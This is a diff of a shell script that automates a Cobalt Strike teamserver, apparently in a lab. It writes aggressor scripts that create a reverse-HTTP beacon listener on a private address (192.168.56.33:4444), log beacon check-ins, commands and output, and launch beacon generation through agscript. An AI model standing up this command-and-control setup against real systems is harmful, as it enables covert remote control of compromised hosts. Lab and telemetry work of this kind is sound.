@@ -11,21 +11,29 @@ sleep 20  # wait for teamserver starting
 
 cat << EOF > /tmp/listener.cna
 on ready {
-  listener_create_ext("$listener_name", "$payload", %(host => "$ts_host", port => $ts_port, beacons => "$ts_host"));
-  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
+  listener_create_ext("$listener_name", "windows/beacon_http/reverse_http", %(host => "192.168.56.33", port => 4444, beacons => "192.168.56.33"));
+  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners() . "\n");
 }
 
 on beacon_initial {
-  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon initialized!");
+  println("[Initial]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . $1 . "\n");
 }
 
 on beacon_checkin {
-  println(formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon checkin!");
+  println("[Checkin]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon ". $1 . ", MSG: " . $2 . "\n");
 }
 
-on * {
-   println("[ $+ $1 $+ ]: " . subarray(@_, 1));
+on beacon_input {
+  println("[Input]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . $1 . ", MSG: " . $2 . ", RESP: " . $3 . "\n");
 }
+
+on beacon_output {
+  println("[Output]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . $1 . ", MSG: " . $2 . "\n");
+}
+
+# on * {
+#   println("[ $+ $1 $+ ]: " . subarray(@_, 1));
+# }
 EOF
 
 # tmux new-window -t collector -n listener './agscript $ts_host 50050 neo $ts_password /tmp/listener.cna &> /tmp/listener.log'
@@ -47,7 +55,6 @@ on ready {
 }
 EOF
 
-# tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna &> /tmp/beacon.log'
 echo "Generating beacon ..."
 tmux new-window -t collector -n beacon './agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna'
 
